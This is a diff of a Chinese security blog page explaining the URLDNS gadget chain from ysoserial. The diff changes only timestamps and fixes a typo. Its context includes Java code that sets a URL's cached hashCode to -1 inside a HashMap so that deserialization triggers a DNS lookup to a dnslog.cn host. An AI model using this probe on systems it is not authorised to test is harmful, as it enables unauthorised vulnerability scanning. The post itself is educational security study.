@@ -92,7 +92,7 @@
 <meta property="og:image" content="http://images.xianyu123.club/20210303160701.png">
 <meta property="og:image" content="http://images.xianyu123.club/20210303164335.png">
 <meta property="og:image" content="http://images.xianyu123.club/20210303162325.png">
-<meta property="og:updated_time" content="2021-03-03T08:57:10.123Z">
+<meta property="og:updated_time" content="2021-03-03T09:00:28.823Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="从ysoserial中学习URLDNS利用链">
 <meta name="twitter:description" content="从ysoserial中学习URLDNS利用链">
@@ -456,7 +456,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; obj = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        String dnslog = <span class="string">"http://t6nr49.dnslog.cn"</span>;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(dnslog);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"java.net.URL"</span>);</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        field = clazz.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(url,-<span class="number">1</span>);</span><br><span class="line">        obj.put(url,<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里我们借助<a href="http://www.dnslog.cn/" target="_blank" rel="noopener">DNSLOG</a>来验证此反序列化漏洞，可以看到成功解析（这里有一个小的tips，大家都知道DNS解析是会在本地留缓存的，所以如果想要重复验证此漏洞，每验证一次就更换一次域名）</p>
 <p><img src="http://images.xianyu123.club/20210303164335.png" alt="image-20210303164335207"></p>
-<p>至于payload中的最后这个类其实无关紧要的，只是<code>ysoserial</code>为了防⽌在⽣payload的时候也执⾏了URL请求和DNS查询。</p>
+<p>至于payload中的最后这个类其实无关紧要的，只是<code>ysoserial</code>为了防⽌生成payload的时候也执⾏了URL请求和DNS查询。</p>
 <p><img src="http://images.xianyu123.club/20210303162325.png" alt="image-20210303162325877"></p>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
 <li>Java安全漫谈 - 08.反序列化篇(2)</li>
@@ -480,7 +480,7 @@
   <p><span>本文标题:</span><a href="/2021/02/24/从ysoserial中学习URLDNS利用链/">从ysoserial中学习URLDNS利用链</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 xianyu123 的个人博客">xianyu123</a></p>
   <p><span>发布时间:</span>2021年02月24日 - 16:09</p>
-  <p><span>最后更新:</span>2021年03月03日 - 16:57</p>
+  <p><span>最后更新:</span>2021年03月03日 - 17:00</p>
   <p><span>原始链接:</span><a href="/2021/02/24/从ysoserial中学习URLDNS利用链/" title="从ysoserial中学习URLDNS利用链">http://0clickjacking0.github.io/2021/02/24/从ysoserial中学习URLDNS利用链/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://0clickjacking0.github.io/2021/02/24/从ysoserial中学习URLDNS利用链/" aria-label="复制成功！"></i></span>
   </p>
